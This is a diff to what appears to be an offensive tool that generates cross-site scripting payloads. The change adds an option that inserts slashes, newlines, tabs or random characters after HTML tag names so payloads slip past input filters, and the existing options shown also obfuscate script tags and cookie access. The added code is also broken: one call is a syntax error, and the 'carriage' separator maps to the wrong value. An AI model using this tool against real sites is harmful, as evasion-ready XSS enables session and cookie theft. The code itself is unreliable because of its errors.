@@ -160,6 +160,7 @@ def arguments():
     parser.add_argument('-o', '--output', action='store', dest='OUTPUT', metavar='<file>', help='Save payload to a file')
     parser.add_argument('-d', '--delay', action='store', dest='DELAY', metavar='<n[s|m|h]>', help='Execute payload after specific period of time (seconds, minutes, hours)')
     parser.add_argument('-e', '--encode', action='store', choices=['base64', 'utf8'], dest='ENCODE', metavar='<encoding>', help='Encode payload')
+    parser.add_argument('-s', '--separator', action='store', choices=['slash', 'newline', 'tab', 'carriage', 'random'], dest='SEPARATOR', metavar='<sep>', help="Use specific (or random) separator between tag and first parameter")
     #Separate group for executable wrappers (it just looks more clear imho)
     parser.add_argument('--tag', action='store_true', dest='TAG', help="Wrap payload with basic <script> tags")
     parser.add_argument('--tag-random', action='store_true', dest='TAG_RANDOM', help="Wrap payload with random <script> tags")
@@ -240,6 +241,22 @@ def main():
     
     if res.COOKIE:
         js_code = js_code.replace("document.cookie", "cookie")
+
+    if res.SEPARATOR:
+        separators = {
+            "slash" : "/",
+            "newline" : "\n",
+            "tab" : "\t",
+            "carriage" : '0x3c'
+        }
+        def select_separator():
+            if res.SEPARATOR == "random":
+                return random.choice(list(separators.values()))
+            else:
+                return separators[res.SEPARATOR]
+        src = bs.(js_code, "html.parser")
+        for tag in src.find_all():
+            js_code = js_code.replace(tag.name, tag.name+select_separator())
 
     if res.TAG_RANDOM: #Just a tag obfuscation (ex. <script> => <ScRiPt>)
         script_tag = "script"
